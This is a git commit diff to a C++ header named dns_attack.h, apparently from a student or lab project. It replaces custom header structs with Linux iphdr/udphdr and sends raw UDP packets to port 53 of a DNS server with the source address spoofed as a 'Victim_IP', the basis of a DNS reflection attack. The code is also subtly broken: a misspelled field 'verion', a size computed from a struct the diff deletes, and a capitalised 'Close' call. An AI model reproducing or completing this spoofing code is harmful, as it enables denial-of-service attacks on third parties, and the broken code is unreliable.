4499145341bb61308a4bb42a00c45b9120753bd2
Yojahuang <yojahuang30613@gmail.com>
2022-02-26 18:31:51 +0800

    Use linux/ip, linux/udp header

--- dns_attack.h
+++ dns_attack.h
@@ -8,6 +8,8 @@
 #include <sys/types.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
+#include <linux/ip.h>
+#include <linux/udp.h>
 
 class dns_attack {
 private:
@@ -35,41 +37,43 @@ void dns_attack::attack() {
 		std::cout << "Success!" << std::endl;
 	}
 
-	struct ipheader {
-		unsigned char      iph_ihl:5,iph_ver:4; // Little Endian
-		unsigned char      iph_tos;
-		unsigned short int iph_len;
-		unsigned short int iph_ident;
-		unsigned char      iph_flag;
-		unsigned short int iph_offset;
-		unsigned char      iph_ttl;
-		unsigned char      iph_protocol;
-		unsigned short int iph_chksum;
-		unsigned int       iph_sourceip;
-		unsigned int       iph_destip;
-	};
-
-	struct udpheader {
-		unsigned short int udph_srcport;
-		unsigned short int udph_destport;
-		unsigned short int udph_len;
-		unsigned short int udph_chksum;
-	};
-
 	char buffer[16384];
 	memset(buffer, 0, sizeof(buffer));
 
-	struct ipheader *ip = (struct ipheader *) buffer;
+	struct iphdr *ip = (struct iphdr *) buffer;
+	struct udphdr *udp = (struct udphdr *) (buffer + sizeof(struct iphdr));
 
-	ip->iph_ihl = 5;
-	ip->iph_ver = 4;
-	ip->iph_tos = 16; // Low delay
-	ip->iph_len = sizeof(struct ipheader) + sizeof(struct udpheader); // Add the size of DNS data later.
-	ip->iph_ident = htons(30678);
-	ip->iph_ttl = 64; // hops
-	ip->iph_protocol = 17; // UDP
-	ip->iph_sourceip = inet_addr(Victim_IP.c_str());
-	ip->iph_destip = inet_addr(Server_IP.c_str());
+	ip->ihl = 5;
+	ip->verion = 4;
+	ip->tos = 16; // Low delay
+	ip->tot_len = sizeof(struct ipheader) + sizeof(struct udpheader); // Add the size of DNS payload later.
+	ip->id = htons(30678);
+	ip->ttl = 64; // hops
+	ip->protocol = 17; // UDP
+	ip->saddr = inet_addr(Victim_IP.c_str());
+	ip->daddr = inet_addr(Server_IP.c_str());
+
+	udp->source = htons(Source_Port);
+	udp->dest = htons(53); // dns port number
+	udp->len = htons(sizeof(struct udphdr)); //
+
+	ip->check = getCheckSum(buffer, sizeof(struct iphdr) + sizeof(struct udphdr));
+
+	struct sockaddr_in sin;
+	sin.sin_family = AF_INET;
+	sin.sin_port = htons(53);
+	sin.sin_addr.s_addr = inet_addr(Server_IP.c_str());
+
+	if (sendto(sockfd, buffer, ip->tot_len, 0,
+	(struct sockaddr *)&sin, sizeof(sin)) < 0)
+	{
+		perror("sendto()");
+		exit(3);
+	}
+	printf("OK: one packet is sent.\n");
+
+
+	Close(sockfd);
 }
 
 
